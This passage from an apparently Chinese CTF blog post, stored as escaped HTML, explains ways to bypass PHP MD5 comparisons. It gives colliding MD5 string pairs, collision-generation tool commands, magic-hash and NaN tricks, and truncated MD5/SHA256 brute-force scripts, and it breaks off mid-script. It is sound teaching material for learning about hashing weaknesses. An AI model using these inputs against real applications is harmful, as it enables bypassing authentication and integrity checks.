punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;由于数组在 string 后都为 array, 所以要求传入两个 MD5 相同的不同字符串且不能是数组，所以通过 MD5 碰撞实现。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#1
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   
b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   
#2
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%
#3
$a=&amp;quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&amp;quot;;
$b=&amp;quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;linux 使用 md5collgen 碰撞生成两个 md5 值相同但内容不同的文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;md5collgen -o 1.bin 2.bin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;windows 可以下载 fastcoll，碰撞生成两个 md5 值相同但内容不同的文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fastcoll.exe -p 123.txt -o 1.txt 2.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;特殊值0e215962017-在md5后仍以0e开头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊值0e215962017-在md5后仍以0e开头&#34;&gt;#&lt;/a&gt; &lt;strong&gt;特殊值：0e215962017 在 md5 后仍以 0e 开头&lt;/strong&gt;&lt;/h3&gt;
&lt;h3 id=&#34;nan和inf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nan和inf&#34;&gt;#&lt;/a&gt; NaN 和 INF&lt;/h3&gt;
&lt;p&gt;NAN 和 INF，分别为非数字和无穷大，但是 var_dump 一下它们的数据类型却是 double，那么在 md5 函数处理它们的时候，是将其直接转换为字符串”NAN” 和字符串”INF” 使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了 true）做强类型或弱类型比较均为 false，甚至 NAN=NAN 都是 false，但 md5 (&#39;NaN&#39;)=md5 (&#39;NaN&#39;) 为 true。&lt;/p&gt;
&lt;h3 id=&#34;截断比较&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#截断比较&#34;&gt;#&lt;/a&gt; 截断比较&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;8ffb1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;md5 截断爆破脚本&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; hashlib&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; multiprocessing&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dummy &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; Pool &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; ThreadPool&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# MD5 截断数值已知 求原始数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 例子 substr (md5 (captcha), 0, 6)=60b7ef&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 计算 MD5 字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; hashlib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;md5&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hexdigest&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;keymd5 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;8ffb1&#39;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;#已知的 md5 截断值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;md5start &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 设置题目已知的截断位置&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;md5length &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;findmd5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sss&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 输入范围 里面会进行 md5 测试&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    start &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 开始位置&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    end &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 结束位置&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;start&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# print(md5(i)[md5start:md5length])&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; md5&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; keymd5&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;            &lt;span class=&#34;token comment&#34;&gt;# 拿到加密字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; i&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 打印&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 参数列表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 多线程的数字列表 开始与结尾&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10000000&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;:&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10000000&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pool &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ThreadPool&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 多线程任务&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pool&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;findmd5&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 函数 与参数列表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pool&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pool&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;sha256 截断爆破&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; hashlib&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; multiprocessing&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dummy &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; Pool &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; ThreadPool&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# sha256 截断数值已知 求原始数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 例子 substr (sha256 (captcha), 0, 6)=60b7ef&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sha256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 计算 sha256 字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; hashlib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sha256&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;TQLCTF&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hexdigest&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;keysha256 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;5625f&#39;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;#已知的 sha256 截断值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sha256start &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 设置题目已知的截断位置&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sha256length &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;findsha256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sss&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 输入范围 里面会进行 sha256 测试&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 